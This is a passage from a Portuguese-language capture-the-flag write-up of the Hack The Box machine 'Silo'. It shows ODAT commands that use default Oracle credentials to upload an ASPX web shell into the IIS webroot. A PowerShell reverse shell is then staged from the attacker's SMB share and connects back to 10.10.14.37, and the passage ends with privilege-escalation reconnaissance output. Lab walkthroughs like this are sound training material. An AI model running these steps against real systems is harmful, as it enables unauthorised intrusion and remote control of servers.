`python3 odat.py cve -s 10.10.10.82 -U SCOTT -P tiger -d XE --test-module`

![33.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/33.jpg)


Eu tentei fazer login com essa cred em outros servicos encontrados, 445,5985 mas sem sucesso/...

## Reverse Shell

Depois de acordar e voltar a ler docs consegui finalmente escrever no server, posteriormente tentar fazer upload de uma reverse shell.

```
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --putFile "C:\inetpub\wwwroot" "anakein.txt" "/root/HTB-Windows/silo/anakein.txt"  --sy
sdba
```

![34.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/34.jpg)

Agora acesso o arquivo que foi enviado

![35.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/35.jpg)


De acordo com a enumeracao anterior, trata-se de um x64 entao eu vou tentar fazer upload de uma web shell e ver se vai funcionar...

E finalmente temos uma webshell

```
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --putFile "C:\inetpub\wwwroot" "antak.aspx" "/root/HTB-Windows/silo/antak.aspx"  --sysd
ba
```

![36.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/36.jpg)

Vou trabalhar agora para obter uma reverse shell

Edit o `vim  Invoke-PowerShellTcp.ps1`

no final do arquivo adicione

`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 53`

Inicie o `impacket-smbserver tools .` no dir onde encontra-se o `Invoke-PowerShellTcp.ps1`

E agora usando a webshell vamos copiar nossa shell para o `C:\Windows\Temp`

`copy \\10.10.14.37\tools\Invoke-PowerShellTcp.ps1 C:\Windows\Temp\`

![37.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/37.jpg)

Ative o listen na porta de acordo com o que voce setou em seu arquivo

`rlwrap nc -nlvp 53`

Entao execute

`C:\Windows\Temp\.\Invoke-PowerShellTcp.ps1`

Temos nossa reverse shell

![38.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-silo/38.jpg)

## Privilege Escalation

Entao vamos la escalar nosso privilegio

```
PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 

```

JuicyPotato? Huuuuuuuuuuuummm

Vammos pegar mais informacoes do nosso sistema, com o `systeminfo` e entao posteriormente buscar por exploits de kernel.

`PS C:\windows\system32\inetsrv> systeminfo >> \\10.10.14.37\tools\systeminfo-SILO.txt`

```

Host Name:                 SILO
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-00115-23036-AA976
Original Install Date:     12/31/2017, 11:01:23 PM
System Boot Time:          6/29/2020, 10:45:01 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 714 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 825 MB
Virtual Memory: In Use:    1,606 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 149 Hotfix(s) Installed.
                           [01]: KB2868626
                           [02]: KB2883200
                           [03]: KB2887595
                           [04]: KB2894852
                           [05]: KB2903939
                           [06]: KB2911106
                           [07]: KB2919355
                           [08]: KB2919394
                           [09]: KB2928680
                           [10]: KB2934520
                           [11]: KB2938066
                           [12]: KB2954879
                           [13]: KB2966826
                           [14]: KB2966828
                           [15]: KB2967917
                           [16]: KB2968296
                           [17]: KB2972103
                           [18]: KB2973114
                           [19]: KB2973351
                           [20]: KB2989930
                           [21]: KB3000850
                           [22]: KB3003057
                           [23]: KB3004361
                           [24]: KB3004365
                           [25]: KB3012702
                           [26]: KB3013172
                           [27]: KB3013791
                           [28]: KB3014442
                           [29]: KB3019978
                           [30]: KB3021910
                           [31]: KB3022777
                           [32]: KB3023219
                           [33]: KB3023266
                           [34]: KB3024751
                           [35]: KB3024755
                           [36]: KB3029603
                           [37]: KB3030377
                           [38]: KB3030947
                           [39]: KB3033446
                           [40]: KB3035126
                           [41]: KB3036612
                           [42]: KB3037576
                           [43]: KB3037924
                           [44]: KB3038002
                           [45]: KB3042085
                           [46]: KB3043812
                           [47]: KB3044374
                           [48]: KB3044673
                           [49]: KB3045634
                           [50]: KB3045685
                           [51]: KB3045717
                           [52]: KB3045719
                           [53]: KB3045755
                           [54]: KB3045992
                           [55]: KB3045999
                           [56]: KB3046017
                           [57]: KB3046737
                           [58]: KB3048043
                           [59]: KB3054169
                           [60]: KB3054203
                           [61]: KB3054256
                           [62]: KB3054464
                           [63]: KB3055323
                           [64]: KB3055343
                           [65]: KB3055642
                           [66]: KB3059317
                           [67]: KB3060681
                           [68]: KB3060793
                           [69]: KB3061512
                           [70]: KB3063843
                           [71]: KB3071756
                           [72]: KB3072307
                           [73]: KB3074228
                           [74]: KB3074545
                           [75]: KB3075220
                           [76]: KB3077715
                           [77]: KB3078405
                           [78]: KB3078676
                           [79]: KB3080042
                           [80]: KB3080149
                           [81]: KB3082089
                           [82]: KB3084135
                           [83]: KB3086255
                           [84]: KB3087041
                           [85]: KB3087137
                           [86]: KB3091297
                           [87]: KB3092601
                           [88]: KB3092627
                           [89]: KB3094486
                           [90]: KB3095701
                           [91]: KB3097992
                           [92]: KB3099834
                           [93]: KB3100473
                           [94]: KB3103616
                           [95]: KB3103696
                           [96]: KB3103709
                           [97]: KB3109103
                           [98]: KB3109976
                           [99]: KB3110329
                           [100]: KB3115224
                           [101]: KB3121261
                           [102]: KB3121461
                           [103]: KB3122651
                           [104]: KB3123245
                           [105]: KB3126033
                           [106]: KB3126434
                           [107]: KB3126587
                           [108]: KB3127222
                           [109]: KB3128650
                           [110]: KB3133043
                           [111]: KB3133690
                           [112]: KB3134179
                           [113]: KB3134815
                           [114]: KB3137728
                           [115]: KB3138602
                           [116]: KB3139164
                           [117]: KB3139398
                           [118]: KB3139914
                           [119]: KB3140219
                           [120]: KB3140234
                           [121]: KB3145384
                           [122]: KB3145432
                           [123]: KB3146604
                           [124]: KB3146723
                           [125]: KB3146751
                           [126]: KB3147071
                           [127]: KB3153704
                           [128]: KB3155784
                           [129]: KB3156059
                           [130]: KB3159398
                           [131]: KB3161949
                           [132]: KB3161958
                           [133]: KB3162343
                           [134]: KB3169704
                           [135]: KB3172614
                           [136]: KB3172729
                           [137]: KB3173424
                           [138]: KB3175024
                           [139]: KB3178539
                           [140]: KB3179574
                           [141]: KB3186539
                           [142]: KB4033369
                           [143]: KB4033428
                           [144]: KB4040972
                           [145]: KB4040974
                           [146]: KB4040981
                           [147]: KB4041777
                           [148]: KB4054854
                           [149]: KB4054519
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.82
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
